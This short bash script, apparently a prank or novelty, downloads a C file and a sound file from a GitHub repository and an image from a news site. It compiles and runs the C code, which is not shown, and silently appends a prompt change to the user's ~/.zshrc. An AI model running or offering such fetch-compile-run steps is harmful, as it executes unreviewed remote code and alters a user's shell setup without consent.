#!/bin/bash


wget https://github.com/Redalamtaoui/Maroc_telecom_pack/raw/main/aa.wav
wget https://github.com/Redalamtaoui/Maroc_telecom_pack/raw/main/aaaaaa.c

image_url="https://media.newyorker.com/photos/665f65409ad64d9e7a494208/4:3/w_1280%2Cc_limit/Chayka-screenshot-06-05-24.jpg"

wget -O image.jpg "$image_url"

cc aaaaaa.c -lSDL2


echo 'PS1="Maroc_telecom=>"' >> ~/.zshrc
./a.out





